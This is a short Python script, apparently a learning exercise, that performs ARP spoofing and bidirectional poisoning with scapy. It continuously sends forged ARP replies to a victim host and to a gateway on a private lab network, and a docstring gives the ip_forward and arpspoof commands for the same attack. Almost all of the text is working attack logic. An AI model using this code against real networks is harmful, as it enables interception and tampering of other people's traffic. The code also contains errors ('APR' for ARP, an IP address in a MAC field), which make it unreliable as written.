"""
arp欺骗和双向毒化
"""
import time

"""
arp欺骗需要在linux上设置
echo 1 >> /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t [目标ip] [网关ip]
"""
from scapy.all import *
def main():
    gatewayIP='192.168.3.2'
    victimIP='192.168.3.137'

    hackMAC = "00:0c:29:e4:a8:ff"
    victimMAC = "00:0c:29:e5:49:e7"
    gatewayMAC = '00:50:56:e3:1f:b5'
    # print(getmacbyip("192.168.3.2"))
    # packet = Ether()/ARP(psrc=gatewayIP,pdst=victimIP)

    #双向毒化
    packet1 = Ether(src=hackMAC,dst=victimMAC)/APR(hwsrc=hackMAC,hwdst=victimIP,psrc=gatewayIP,pdst=victimIP,op=2)
    packet2 = Ether(src=hackMAC,dst=gatewayMAC)/APR(hwsrc=hackMAC,hwdst=gatewayMAC,psrc=victimIP,pdst=gatewayIP,op=2)

    while 1:
        # sendp(packet)
        # time.sleep(2)
        # print(packet.show())

        sendp(packet1,iface='eth0',verbose=False)
        sendp(packet2, iface='eth0', verbose=False)
        time.sleep(1)
        print(packet1.show())
        print(packet2.show())

    pass
if __name__ == '__main__':
    main()